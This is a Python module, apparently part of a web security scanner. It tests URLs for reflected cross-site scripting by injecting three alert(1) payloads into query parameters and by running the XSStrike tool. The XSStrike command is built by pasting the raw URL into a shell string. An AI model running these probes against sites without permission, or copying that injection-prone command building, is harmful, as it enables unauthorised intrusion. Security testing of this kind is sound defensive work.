import os
import requests
from core.utils import run_command, save_raw_output

def quick_xss_test(url, workspace_dir):
    """
    Simple reflected XSS test with a few payloads.
    """
    print(f"[Validation] Quick XSS test on {url}")
    payloads = [
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "'><img src=x onerror=alert(1)>"
    ]
    try:
        session = requests.Session()
        base_url = url.split('?')[0]
        params = {}
        if '?' in url:
            qs = url.split('?')[1]
            for pair in qs.split('&'):
                if '=' in pair:
                    k, v = pair.split('=', 1)
                    params[k] = v

        for param in params:
            original = params[param]
            for payload in payloads:
                test_params = params.copy()
                test_params[param] = payload
                try:
                    resp = session.get(base_url, params=test_params, timeout=10)
                    if payload in resp.text:
                        return {
                            'validated': True,
                            'type': 'XSS',
                            'parameter': param,
                            'payload': payload,
                            'evidence': f"Payload reflected in response"
                        }
                except Exception:
                    pass
    except Exception as e:
        print(f"[Validation] Quick XSS test error: {e}")
    return {'validated': False}

def validate_xss_xsstrike(url, workspace_dir):
    """
    Use XSStrike to validate XSS.
    """
    print(f"[Validation] Running XSStrike on {url}")
    out_file = os.path.join(workspace_dir, 'validation', f'xsstrike_{abs(hash(url))}.json')
    cmd = f"xsstrike -u {url} --json"
    stdout, stderr, rc = run_command(cmd, timeout=180)
    save_raw_output(workspace_dir, 'validation', f'xsstrike_{abs(hash(url))}', stdout + stderr, 'txt')

    if "Vulnerable" in stdout:
        return {
            'validated': True,
            'type': 'XSS',
            'tool': 'XSStrike',
            'evidence': stdout[:500]
        }
    else:
        return {'validated': False}